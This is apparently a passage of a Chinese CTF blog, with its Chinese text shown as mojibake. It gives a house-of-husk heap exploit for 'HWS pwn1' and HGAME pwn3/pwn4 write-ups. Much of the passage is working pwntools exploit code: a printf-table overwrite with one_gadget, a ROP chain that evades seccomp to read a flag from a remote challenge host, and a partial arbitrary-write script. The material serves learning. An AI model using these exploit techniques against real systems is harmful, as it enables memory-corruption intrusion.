<p>è¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯ä»<code>main_arena+8</code>å¼€å§‹å­˜æ”¾<code>fastbin[0x20]</code>çš„å¤´æŒ‡é’ˆ,glibcé¢„ç•™äº†åä¸ªæŒ‡é’ˆæ¥å­˜æ”¾fastbinçš„å¤´æŒ‡é’ˆï¼Œæ¯”å¦‚freeçš„chunkæ˜¯0x50,é‚£å‚¨å­˜è¿™ä¸ªå †åœ°å€çš„åœ°å€æ˜¯main_arena+8+(0x50-0x20)/0x10*8ä¹Ÿå°±æ˜¯åœ¨main_arena+32å¤„å­˜æ”¾å †åœ°å€ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯main_arena+8åŠ ä¸Šåç§»é‡å¤„å­˜æ”¾å †åœ°å€ï¼Œè¿™ä¸ªåç§»é‡å’Œsizeæ­£ç›¸å…³ï¼Œå½“é€šè¿‡ä¿®æ”¹global_max_fastçš„å€¼è®©å¯freeçš„chunkçš„sizeæ˜¯ä»»æ„å€¼ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å‘main_arena+8åçš„ä»»æ„ä¸€ä¸ªåœ°å€å¡«ä¸Šå †åœ°å€äº†ã€‚</p>
<p>å¾ˆæœ‰æ„æ€çš„æ”»å‡»æ‰‹æ®µï¼Œé‚£ä¹Ÿå°±æ˜¯è¯´å¯ä»¥å‘__printf_arginfo_tableå’Œ__printf_function_tableä¸­å¡«å…¥å †åœ°å€äº†ï¼Œåˆ°è¿™é‡Œæ”»å‡»æ€è·¯å°±é—­ç¯ã€‚</p>
<h2 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h2><p>å…ˆä¿®æ”¹global_max_fastçš„å€¼ï¼Œç„¶åç”³è¯·ä¸¤ä¸ªå †ï¼Œå †çš„å¤§å°é€šè¿‡ä¸‹é¢çš„å…¬å¼ç®—å‡ºï¼Œå„ä¼ªé€ ä¸€ä¸ªè™šè¡¨ï¼Œç„¶åå†ä¼ªé€ printf_arginfo_tableçš„å †ä¸Šå†™å¥½ogg,ç„¶åéƒ½freeæ‰ä¿®æ”¹è™šè¡¨åœ°å€ï¼Œæœ€åè°ƒç”¨printfå®Œæˆæ”»å‡»</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>1.ä¸åŒç‰ˆæœ¬main_arena+8åˆ°__printf_arginfo_tableå’Œ__printf_function_tableçš„åç§»é‡ä¸åŒï¼Œæ ¹æ®åç§»é‡ç¡®å®šsizeçš„å€¼å®Œæˆå †åœ°å€è¦†ç›–ã€‚</p>
<p>â€‹               chunk_size=åœ°å€å·®å€¼*2+0x20</p>
<p>2.å®æ–½å‰æï¼š</p>
<p>â€‹            1.æœ‰è‡³å°‘ä¸€æ¬¡ufaå®Œæˆglobal_max_fastçš„ä¿®æ”¹                                                                                                                                                                              </p>
<p>â€‹            2.æœ‰prinfå‡½æ•°ä¸”ç¬¬äºŒä¸ªå‚æ•°å¯æ§</p>
<p>ä¾‹é¢˜ HWS pwn1</p>
<p>æ„Ÿè§‰è¿™é“é¢˜ä½œä¸ºhouse of huskçš„å…¥é—¨é¢˜æŒºä¸é”™çš„ï¼Œç®€ç›´å°±æ˜¯ä¸“é—¨ä¸ºè¿™ä¸ªåˆ©ç”¨è€Œç”Ÿ,åˆšå¥½æœ‰ä¸€æ¬¡unsortbinatack,åˆšå¥½èƒ½ç”³è¯·ä¸¤ä¸ªåˆæ³•çš„å †ï¼Œåˆšå¥½æœ‰å¾ˆå¤šprintf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">fastbinY=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a big box, what size?\n&#x27;</span>)</span><br><span class="line">    print_arginfo_table=<span class="number">0x3ec870</span></span><br><span class="line">    printf_function_table=<span class="number">0x3f0738</span></span><br><span class="line">    chunk_size1=(print_arginfo_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    chunk_size2=(printf_function_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size1))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a bigger box, what size?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size2))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Do you want to rename?(y/n)\n&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;y\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now your name is:&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input your new name!\n&#x27;</span>)</span><br><span class="line">    global_max_fast_addr=libc_base+<span class="number">0x3ed940</span></span><br><span class="line">    sh.send(p64(<span class="number">0</span>)+p64(global_max_fast_addr-<span class="number">0x10</span>))</span><br><span class="line">    </span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;box?(1:big/2:bigger)\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let\&#x27;s edit, &#x27;</span>)</span><br><span class="line">    ogg=libc_base+<span class="number">0x4f432</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(ogg)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    payload=<span class="string">&quot;a&quot;</span>*<span class="number">8</span>*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>)-<span class="number">2</span>) + p64(ogg)*<span class="number">2</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/HGAME/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/22/HGAME/" class="post-title-link" itemprop="url">HGAME</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-01-22 21:10:53 / ä¿®æ”¹æ—¶é—´ï¼š21:11:07" itemprop="dateCreated datePublished" datetime="2022-01-22T21:10:53+08:00">2022-01-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="HGAMEâ€”-PWN"><a href="#HGAMEâ€”-PWN" class="headerlink" title="HGAMEâ€”-PWN"></a>HGAMEâ€”-PWN</h1><p>æ„Ÿè§‰é¢˜ç›®è´¨é‡æŒºé«˜çš„ï¼Œç›®å‰å°±åšäº†pwn1,pwn3,pwn4.pwn1æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºï¼Œé‡ç‚¹è®°å½•ä¸€ä¸‹pwn3å’Œpwn4çš„æ”»å‡»æ€è·¯ï¼Œå› ä¸ºæ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§åˆ°è¿™ç§æ€è·¯ã€‚ï¼ˆå…¨ç¨‹è¢«ayoungå’Œmarkå¸¦ï¼‰</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>é¢˜ç›®æç¤ºåå¼¹ä¸äº†shellè€Œä¸”å­˜flagçš„æ–‡ä»¶ä¸å«flag,æ‰€ä»¥ä¸èƒ½ç”¨ä¼ ç»Ÿçš„orwçš„ropæ¥å¾—åˆ°flag,æ²™ç›’é‡Œä¹Ÿç¦ç”¨äº†ä¸€äº›å‡½æ•°</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/get-shell/hgame/pwn3/to_give_out$ seccomp-tools dump ./vuln</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>æœ‰äº›æ²™ç›’æ˜¯ç™½åå•ï¼Œæœ‰äº›æ²™ç›’æ˜¯é»‘åå•ï¼Œè¿™ä¸ªå°±æ˜¯é»‘åå•ï¼Œå¯ä»¥çœ‹å‡ºç¦ç”¨äº†execveå‡½æ•°ä¸èƒ½åå¼¹shell.</p>
<h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>ä¸èƒ½å¼¹shellçš„è¯å°±å¾—ç”¨orwæ¥è¯»flag,ç”¨orwçš„è¯å¾—å…ˆçŸ¥é“å¯¹é¢æ–‡ä»¶åæ‰è¡Œï¼Œmarkæç¤ºè¯´ç”¨getdentså‡½æ•°å¾—åˆ°æ–‡ä»¶åå†ç”¨orwå¾—åˆ°flag,getdentså‡½æ•°çš„å®Œæ•´æ”»å‡»æ€è·¯æ˜¯ogw,æ„å³ç”¨openæ‰“å¼€æ–‡ä»¶å¤¹ï¼Œç”¨getdentså‡½æ•°æŠŠæ–‡ä»¶ååœ¨å†™ç¨‹åºé‡Œï¼Œç„¶åç”¨writeå‡½æ•°å†™å‡ºæ¥ï¼Œè¿™æ˜¯è°ƒç”¨ä»–ä»¬æ—¶çš„å‚æ•°æ„é€ </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;./&#x27;</span>,<span class="number">0x1000</span>,<span class="number">0</span>)</span><br><span class="line">getdents(å¥æŸ„ï¼ˆ<span class="number">0</span>ï¼‰,åœ°å€ï¼Œ<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br><span class="line">write(<span class="number">1</span>,åœ°å€ï¼Œ<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br></pre></td></tr></table></figure>

<p>å…ˆé€šè¿‡ropè°ƒç”¨ogwå¾—åˆ°flagæ–‡ä»¶åï¼Œç„¶åè°ƒç”¨orwè¯»flag</p>
<h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x0000000000401443: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401441: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000040143d: pop rsp; pop r13; pop r14; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x00000000004013DC&#x27;)</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401441</span></span><br><span class="line">main=<span class="number">0x401311</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line">libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(syscall_addr)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(execve_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#sh.send(&#x27;./\x00&#x27;)</span></span><br><span class="line">sh.send(<span class="string">&#x27;flagd44b02e91a1d1648cbfc\x00&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)</span><br><span class="line">payload+=p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_addr)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#hgame&#123;1-4dm1T~The-rop-ChA!N-M4YBE~TOoO0oooO0-l0Ng_And~$Orry_fOR_ThE~|Nc0NVenIENCE:(&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ„Ÿè§‰æ„é€ ropçš„æŒºå¥½ç©çš„</p>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>ç¨‹åºå°±æ˜¯spfaç®—æ³•çš„å®ç°ï¼Œåˆšå¼€å§‹æˆ‘å°±åˆ†æå‡ºæ€è·¯äº†ï¼Œå°±æ˜¯åˆ©ç”¨distè¿›è¡Œä»»æ„è¯»å’Œä»»æ„å†™ï¼Œæœ¬æ¥æ‰“ç®—æ˜¯åˆ©ç”¨exit_hookæ‹¿shellçš„ï¼Œæ”¹æ˜¯èƒ½æ”¹æˆåŠŸï¼Œä½†æ˜¯æ”¹æˆåŠŸåç¨‹åºå°±å¼‚å¸¸é€€å‡ºäº†ï¼Œä»–ä¹Ÿä¸è°ƒç”¨exit-hookå•Šï¼Œå®ç°+è°ƒè¯•+å‘ç°é”™è¯¯+å®šä½é”™è¯¯å°±ç”¨äº†ä¸€å¤©ï¼Œæ™šä¸ŠåäºŒç‚¹å¤šæ˜¯åœ¨å—ä¸äº†å°±é—®äº†ayoung,ä»–å‘Šè¯‰æˆ‘æ”¹å†™ioè™šè¡¨æŒ‡é’ˆï¼Œæˆ‘å“ªçŸ¥é“è¿™æ˜¯å•¥å•Šï¼Œç¬¬ä¸€æ¬¡å¬ï¼Œä½†æ˜¯æ”¹ioæŒ‡é’ˆè‚¯å®šæ˜¯é€šè¿‡printfæˆ–è€…scanfå®ç°çš„ï¼Œæˆ‘å°±è¿›è¡Œæ…¢æ…¢è°ƒè¯•ç¨‹åºï¼Œè¿˜çœŸè¢«æˆ‘å‘ç°ä¸€äº›è™šè¡¨äº†ï¼Œmarkåˆ©ç”¨io_file_jumpså‡ºäº†ï¼Œæˆ‘åˆ©ç”¨io_helper_jumpså‡ºäº†ï¼ˆå››ç‚¹å‡ºçš„ï¼‰</p>
<h3 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">47250</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./spfa&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&quot;b main&quot;)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many datas?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2275</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    dist_addr=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-<span class="number">8</span>+<span class="number">0x4720</span></span><br><span class="line">    elf_base=dist_addr-<span class="number">0x4720</span>-<span class="number">0x7000</span></span><br><span class="line">    bss_addr=dist_addr-<span class="number">0x4720</span></span><br><span class="line">    dock_addr=elf_base+<span class="number">0x16A5</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(bss_addr)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many 